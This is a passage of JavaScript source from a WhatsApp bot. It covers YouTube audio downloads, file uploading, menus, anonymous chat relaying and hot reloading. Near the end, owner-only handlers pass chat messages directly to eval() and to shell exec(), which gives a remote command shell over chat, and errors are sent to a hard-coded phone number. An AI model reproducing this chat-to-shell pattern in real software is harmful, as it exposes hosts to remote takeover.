                body:"YOUTUBE MP3",
                mediaType:2,
                thumbnail:buf,
                mediaUrl:`${text}`, 
                sourceUrl: `${media.title}` }}}, {quoted:m})
                }
            break
case 'ytmp32':
  case 'youtubemp32':{
   const templateMessage = {
text: "*_AGUARDE.._*",
footer: 'não deve demorar muito..',
templateButtons: []
}

anya.sendMessage(m.chat, templateMessage)
  if (args.length < 1) return m.reply('Where is the link?')
   try{
    await yta(args[0])
.then((res) => {
     const { dl_link } = res
const { title } = res
      axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
   
      anya.sendMessage(from, { audio: { url: dl_link }, mimetype: 'audio/mp4' }, { quoted: m})
      })
      
})
     } catch (e){
    m.reply(from, `Access denied, can't download!. Try using another link`, { quoted : m })
   }
  }
  break
case 'tourl': {
   m.reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
   let media = await anya.downloadAndSaveMediaMessage(quoted)
   if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
  m.reply(util.format(anu))
   } else if (!/image/.test(mime)) {
  let anu = await UploadFileUgu(media)
  m.reply(util.format(anu))
   }
   await fs.unlinkSync(media)
 }
 break
 default:
 
if (prefix && isCmd) {
//addFilter(from) 
alonekj = `*── 「 ERROR 」 ──*\n\n*🗂 ️nome: ${pushname}*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O comando ${prefix + command} não existe, clique no botão abaixo para verificar o menu!*`
let buttons = [
                        { buttonId: `${prefix}menu`, buttonText: { displayText: `𝑴𝑬𝑵𝑼` }, type: 1 },
                        { buttonId: `${prefix}delete`, buttonText: { displayText: `𝐴𝑷𝐴𝑮𝐴𝑹` }, type: 1 }                       
                    ]
                    await anya.sendButtonText(m.chat, buttons, alonekj, `${watermark}`, m)    
                    }
                    
 
   if (budy.startsWith('=>')) {
   if (!isCreator) return m.reply(mess.owner)
  function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
  if (sat == undefined) {
 bang = util.format(sul)
  }
  return m.reply(bang)
  }
  try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
  } catch (e) {
m.reply(String(e))
  }
   }

   if (budy.startsWith('>')) {
   if (!isCreator) return m.reply(mess.owner)
  try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
  } catch (err) {
await m.reply(String(err))
  }
   }

   if (budy.startsWith('$')) {
if (!isCreator) return m.reply(mess.owner)
  exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
  })
   }
   
   
   
if (budy === "Bot" || (budy === "bot") || (budy === "BOT")) {
let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                kk = `「 𝐎𝐍𝐋𝐈𝐍𝐄 」`
   let buttons = [
                        { buttonId: `blabla`, buttonText: { displayText: `${nomedobot}` }, type: 1 },                       
                    ]
                    await anya.sendButtonText(m.chat, buttons, kk, `tempo de resposta: ${latensi.toFixed(4)}\ntempo ativo: ${runtime(process.uptime())}\nprefix "!"\n\n「 ${nomedobot} 」`, m)   
}

if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
  this.anonymous = this.anonymous ? this.anonymous : {}
  let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
  if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
  contextInfo: {
 ...m.msg.contextInfo,
 forwardingScore: 0,
 isForwarded: true,
 participant: other
  }
} : {})
  }
  return !0
   }
if (isCmd && budy.toLowerCase() != undefined) {
    if (m.chat.endsWith('broadcast')) return
    if (m.isBaileys) return
    let msgs = global.db.database
    if (!(budy.toLowerCase() in msgs)) return
    anya.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

/*if ((m.mtype === 'reactionMessage') && m.isGroup) {
    anya.sendMessage(from, {text: `Detectou *${pushname} @${m.sender.split("@")[0]}* Reação de envio.`, mentions: [m.sender]}, {quoted: m})
        }*/
        
        if ((m.mtype === 'groupInviteMessage' || budy.startsWith('https://chat') || budy.startsWith('Abra este link')) && !m.isGroup) {
        	let buttons = [
                    {buttonId: `!owner`, buttonText: {displayText: '𝑶𝑾𝑵𝑬𝑹 𝑩𝑶𝑻'}, type: 1}
                ]
			anya.sendMessage(from, {text:`CONVITE DETECTADO\n\Deseja adicionar este bot ao seu grupo?`, title: 'LINK DE GRUPO DETECTADO', footer: `${watermark}`, buttons: buttons, headerType: 5})
		}
if(m.mtype === 'imageMessage' && !m.isGroup) {
anya.sendMessage(m.chat, {text: `IMAGEM DETECTADA\n\nCaso vc deseje transformar esta imagem numa figurinha basta marcar a foto com a legenda: !s`}, {quoted:m})
}

    } catch (err) {
anya.sendText("558898204406@s.whatsapp.net", util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
